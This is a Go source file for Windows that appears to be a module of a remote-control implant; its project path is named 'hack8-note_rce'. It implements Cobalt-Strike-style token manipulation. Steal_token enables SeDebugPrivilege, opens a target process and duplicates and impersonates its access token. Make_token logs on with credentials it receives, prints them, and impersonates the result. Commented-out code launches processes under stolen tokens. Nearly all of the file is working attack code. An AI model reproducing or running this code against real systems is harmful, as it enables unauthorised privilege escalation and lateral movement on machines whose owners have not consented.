//go:build windows

package packet

import (
	"bytes"
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"hack8-note_rce/Util"
	"syscall"
	"unsafe"
)

// References: https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code
type Luid struct {
	lowPart  uint32 // DWORD
	highPart int32  // long
}
type LuidAndAttributes struct {
	luid       Luid   // LUID
	attributes uint32 // DWORD
}

type TokenPrivileges struct {
	privilegeCount uint32 // DWORD
	privileges     [1]LuidAndAttributes
}

var (
	advapi32DLL             = syscall.NewLazyDLL("Advapi32.dll")
	LookupPrivilegeValueW   = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
	AdjustTokenPrivileges   = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
	ImpersonateLoggedOnUser = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonatefmtgedonuser
	DuplicateTokenEx        = advapi32DLL.NewProc("DuplicateTokenEx")        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
	CreateProcessWithTokenW = advapi32DLL.NewProc("CreateProcessWithTokenW") // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
	CreateProcessWithLogonW = advapi32DLL.NewProc("CreateProcessWithLogonW")
	LogonUserA              = advapi32DLL.NewProc("LogonUserA")
	LogonUserW              = advapi32DLL.NewProc("LogonUserW")
	LogonUserExW            = advapi32DLL.NewProc("LogonUserExW")
)

const (
	// [Access Rights for Access-Token Objects](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects)
	TOKEN_QUERY             = 0x0008 // Required to query an access token.
	TOKEN_DUPLICATE         = 0x0002 // Required to duplicate an access token.
	TOKEN_ADJUST_PRIVILEGES = 0x0020 // Required to enable or disable the privileges in an access token.
	// [Process Security and Access Rights](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000 // Windows Server 2003 and Windows XP: This access right is not supported.
	// [ACCESS_MASK](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b)
	MAXIMUM_ALLOWED = 0x02000000
	// [SECURITY_IMPERSONATION_LEVEL enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level)
	SecurityImpersonation = 2
	// [TOKEN_TYPE enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type)
	TokenPrimary = 1
	// [CreateProcessWithTokenW function](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
	LOGON_WITH_PROFILE = 0x00000001
	// [CreateToolhelp32Snapshot function](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
	TH32CS_SNAPPROCESS = 0x00000002
)

func enableSeDebugPrivilege() error {
	var CurrentTokenHandle syscall.Token
	var tkp TokenPrivileges
	// [Privilege Constants (Authorization)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
	SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")

	CurrentProcessHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		fmt.Println("[-] GetCurrentProcess() error:", err)
		return err
	} else {
		fmt.Println("[+] GetCurrentProcess() success")
	}

	err = syscall.OpenProcessToken(CurrentProcessHandle, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
	if err != nil {
		fmt.Println("[-] OpenProcessToken() error:", err)
		return err
	} else {
		fmt.Println("[+] OpenProcessToken() success")
	}

	result, _, err := LookupPrivilegeValueW.Call(uintptr(0), uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
	if result != 1 {
		fmt.Println("[-] LookupPrivilegeValue() error:", err)
		return err
	} else {
		fmt.Println("[+] LookupPrivilegeValue() success")
	}

	result, _, err = AdjustTokenPrivileges.Call(uintptr(CurrentTokenHandle), 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
	if result != 1 {
		fmt.Println("[-] AdjustTokenPrivileges() error:", err)
		return err
	} else {
		fmt.Println("[+] AdjustTokenPrivileges() success")
	}

	return err
}

// Reference: https://github.com/yusufqk/SystemToken/blob/master/main.c len 102
func handleProcess(pid uint32) (syscall.Handle, error) {
	fmt.Println("[+] OpenProcess() start.")
	ProcessHandle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, true, pid)
	// fmt.Println(err)
	if err != nil {
		ProcessHandle, err = syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
		if err != nil {
			fmt.Println("[-] OpenProcess() error:", err)
			return 0, errors.New("[-] OpenProcess() error: " + err.Error())
		}
	} else {
		fmt.Println("[+] OpenProcess() success:", ProcessHandle)
	}
	return ProcessHandle, nil
}

/*func runAsToken(TokenHandle uintptr, command string) error {

	command_ptr, _ := syscall.UTF16PtrFromString(command)

	var NewTokenHandle syscall.Token
	var StartupInfo syscall.StartupInfo
	var ProcessInformation syscall.ProcessInformation

	result, _, err := DuplicateTokenEx.Call(TokenHandle, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
	if result != 1 {
		fmt.Println("[-] DuplicateTokenEx() error:", err)
	} else {
		fmt.Println("[+] DuplicateTokenEx() success")
	}

	result, _, err = CreateProcessWithTokenW.Call(uintptr(NewTokenHandle), LOGON_WITH_PROFILE, uintptr(0), uintptr(unsafe.Pointer(command_ptr)), 0, uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&StartupInfo)), uintptr(unsafe.Pointer(&ProcessInformation)))
	if result != 1 {
		fmt.Println("[-] CreateProcessWithTokenW() error:", err)
	} else {
		fmt.Println("[+] CreateProcessWithTokenW() success")
	}

	return err
}


func Steal_token(pid uint32){
	var TokenHandle syscall.Token
	err := enableSeDebugPrivilege()
	if err.Error() != ("The operation completed successfully.") {
		fmt.Println(err)
		return
	}
	ProcessHandle := handleProcess(pid)
	err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
	if err != nil {
		fmt.Println("[-] OpenProcessToken_main() error:", err)
	} else {
		fmt.Println("[+] OpenProcessToken_main() success")
	}

	command :=config.Steal_token_command

	err = runAsToken(uintptr(TokenHandle),command)
	if err != nil {
		return
	}

}*/

func runAsToken(TokenHandle uintptr) (*syscall.Token, error) {

	var NewTokenHandle syscall.Token

	/*_, _, err := ImpersonateLoggedOnUser.Call(TokenHandle)
	if err != nil {
		fmt.Println("[-] ImpersonateLoggedOnUser() error:", err)
	} else {
		fmt.Println("[+] ImpersonateLoggedOnUser() success")
	}*/

	result, _, err := DuplicateTokenEx.Call(TokenHandle, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
	if result != 1 {
		fmt.Println("[-] DuplicateTokenEx() error:", err)
		return nil, errors.New("[-] DuplicateTokenEx() error: " + err.Error())
	} else {
		fmt.Println("[+] DuplicateTokenEx() success")
	}

	_, _, err = ImpersonateLoggedOnUser.Call(uintptr(NewTokenHandle))
	if err != nil && err.Error() != ("The operation completed successfully.") {
		fmt.Println("[-] ImpersonateLoggedOnUser() error:", err)
		return nil, errors.New("[-] ImpersonateLoggedOnUser() error: " + err.Error())
	} else {
		fmt.Println("[+] ImpersonateLoggedOnUser() success")
	}

	/*cmd :=exec.Command("cmd","/c","whoami")
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Sprintf("exec failed with %s\n", err)
	}
	fmt.Printf("out: %s\n",out)
	fmt.Println(out)*/

	return &NewTokenHandle, nil
}

func Steal_token(pid uint32) (uintptr, []byte, error) {
	var TokenHandle syscall.Token
	err := enableSeDebugPrivilege()
	if err != nil && err.Error() != ("The operation completed successfully.") {
		fmt.Println(err)
		return 0, nil, err
	}
	ProcessHandle, err := handleProcess(pid)
	if err != nil && err.Error() != ("The operation completed successfully.") {
		fmt.Println(err)
		return 0, nil, err
	}
	err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
	if err != nil && err.Error() != ("The operation completed successfully.") {
		fmt.Println("[-] OpenProcessToken_main() error:", err)
		return 0, nil, errors.New("[-] OpenProcessToken_main() error: " + err.Error())
	} else {
		fmt.Println("[+] OpenProcessToken_main() success")
	}

	//var TokenHandleTemp *syscall.Token
	TokenHandleTemp, err := runAsToken(uintptr(TokenHandle))
	if err != nil && err.Error() != ("The operation completed successfully.") {
		return 0, nil, err
	} else {
		return uintptr(*TokenHandleTemp), []byte("Steal token success"), nil
	}

}

func Run2self() (bool, error) {
	err := windows.RevertToSelf()
	if err != nil {
		return false, err
	}
	return true, nil
}

func Make_token(b []byte) (uintptr, error) {
	var Token syscall.Token
	buf := bytes.NewBuffer(b)
	arg, err := Util.ParseAnArg(buf)
	if err != nil {
		return 0, err
	}
	domain := string(arg)
	arg, err = Util.ParseAnArg(buf)
	if err != nil {
		return 0, err
	}
	username := string(arg)
	arg, err = Util.ParseAnArg(buf)
	if err != nil {
		return 0, err
	}
	password := string(arg)

	fmt.Printf("domain: %s\n", domain)
	fmt.Printf("username: %s\n", username)
	fmt.Printf("password: %s\n", password)

	lpDomain, _ := windows.UTF16PtrFromString(domain)
	//fmt.Printf("b: %s\n", b)
	lpUsername, _ := windows.UTF16PtrFromString(username)
	lpPassword, _ := windows.UTF16PtrFromString(password)

	err = enableSeDebugPrivilege()
	if err != nil && err.Error() != ("The operation completed successfully.") {
		fmt.Println(err)
		return 0, err
	}

	result, _, _ := LogonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), 9, 0, uintptr(unsafe.Pointer(&Token)))

	if result != 1 {
		return 0, err
	}

	TokenTemp, err := runAsToken(uintptr(Token))
	if err != nil {
		return 0, err
	} else {
		return uintptr(*TokenTemp), nil
	}
}

/*var (
	sI windows.StartupInfo
	pI windows.ProcessInformation
)

program, _ := windows.UTF16PtrFromString("main.exe")

result, _, err := DuplicateTokenEx.Call(uintptr(Token), MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&Token)))
if result != 1 {
	fmt.Println("[-] DuplicateTokenEx() error:", err)
} else {
	fmt.Println("[+] DuplicateTokenEx() success")
}

var NewToken syscall.Token
result, _, err = CreateProcessWithTokenW.Call(
	uintptr(NewToken),
	LOGON_WITH_PROFILE,
	uintptr(0),
	uintptr(unsafe.Pointer(program)),
	0,
	uintptr(0),
	uintptr(0),
	uintptr(unsafe.Pointer(&sI)),
	uintptr(unsafe.Pointer(&pI)))

if result != 1 {
	fmt.Println("[-] CreateProcessWithTokenW() error:", err)
	return &Token
} else {
	fmt.Println("[+] CreateProcessWithTokenW() success")
}
if err != nil && err.Error() != ("The operation completed successfully.") {
	return &Token
	fmt.Println(err)
}*/

/*func GetCurrentProcessToken() syscall.Token{
	var TokenHandle syscall.Token



	//enableSeDebugPrivilege()

	ProcessHandle, err := syscall.GetCurrentProcess()

	err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
	if err != nil {
		log.Println("[-] OpenProcessToken() error:", err)
	} else {
		log.Println("[+] OpenProcessToken() success")
	}

	//ProcessHandle, err :=windows.GetCurrentThread()

	//OpenThreadToken := advapi32DLL.NewProc("OpenThreadToken")

	//r, _, err := OpenThreadToken.Call(uintptr(ProcessHandle), TOKEN_QUERY|TOKEN_DUPLICATE, uintptr(1), uintptr(unsafe.Pointer(&TokenHandle)))
	//if r != 1 {
	//	log.Println("[-] OpenThreadToken() error:", err)
	//} else {
	//	log.Println("[+] OpenThreadToken() success")
	//}

	//runAsToken(uintptr(TokenHandle), syscall.StringToUTF16Ptr(command))
	var NewTokenHandle syscall.Token
	result, _, err := DuplicateTokenEx.Call(uintptr(TokenHandle), MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
	if result != 1 {
		log.Println("[-] DuplicateTokenEx() error:", err)
	} else {
		log.Println("[+] DuplicateTokenEx() success")
	}

	return NewTokenHandle
}*/
